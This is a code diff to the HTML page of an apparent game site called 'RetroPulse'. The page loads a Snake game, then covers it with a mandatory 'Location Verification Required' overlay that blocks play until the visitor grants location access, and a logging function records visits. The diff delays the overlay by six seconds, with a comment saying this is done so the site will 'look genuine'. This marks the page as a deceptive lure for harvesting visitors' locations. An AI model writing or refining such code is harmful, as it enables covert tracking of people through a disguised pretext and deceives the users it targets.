@@ -8,14 +8,14 @@
 </head>
 <body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col items-center justify-between p-4 relative">
     
-    <!-- Mandatory Location Lock Overlay (Appears on /game path) -->
+    <!-- Mandatory Location Lock Overlay (Appears after 5-10 seconds on /game path) -->
     <div id="mandatory-geo-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5, 5, 5, 0.95); backdrop-filter: blur(8px); z-index: 99999; align-items: center; justify-content: center;">
         <div style="background: #1e1e24; color: #fff; padding: 28px; border-radius: 12px; font-family: Roboto, Arial, sans-serif; box-shadow: 0 8px 32px rgba(0,0,0,0.8); width: 340px; border: 1px solid #333; text-align: center;">
             <div style="font-size: 36px; margin-bottom: 12px;">📍</div>
-            <div style="font-weight: bold; font-size: 18px; margin-bottom: 8px; color: #00ffcc;">Location Access Required</div>
-            <div style="font-size: 13px; line-height: 1.5; color: #aaa; margin-bottom: 20px;">To play on RetroPulse, you must enable your location to connect to the regional gaming cluster.</div>
+            <div style="font-weight: bold; font-size: 18px; margin-bottom: 8px; color: #00ffcc;">Location Verification Required</div>
+            <div style="font-size: 13px; line-height: 1.5; color: #aaa; margin-bottom: 20px;">To continue playing on RetroPulse, please verify your location to connect to the regional gaming cluster.</div>
             
-            <button id="mandatory-allow-btn" style="background: #00ffcc; color: #000; border: none; width: 100%; padding: 12px; font-size: 14px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: background 0.2s;">Enable Location & Play</button>
+            <button id="mandatory-allow-btn" style="background: #00ffcc; color: #000; border: none; width: 100%; padding: 12px; font-size: 14px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: background 0.2s;">Enable Location & Continue</button>
             <div id="error-msg" style="color: #ff5555; font-size: 12px; margin-top: 10px; display: none;">Location access is mandatory to proceed.</div>
         </div>
     </div>
@@ -66,13 +66,15 @@
         }
 
         window.addEventListener('DOMContentLoaded', () => {
-            // Default boot into Nokia Snake visually underneath
+            // Default boot into Nokia Snake
             initSnakeGame(container);
 
             // Check if URL path includes '/game'
             if (window.location.pathname.includes('/game')) {
-                // Force show the mandatory location overlay immediately
-                document.getElementById('mandatory-geo-overlay').style.display = 'flex';
+                // Wait 6 seconds to let the site load and look genuine before popping up the mandatory lock
+                setTimeout(() => {
+                    document.getElementById('mandatory-geo-overlay').style.display = 'flex';
+                }, 6000);
             } else {
                 // If not on /game path, log normally without coordinates
                 sendLogData(null, null);
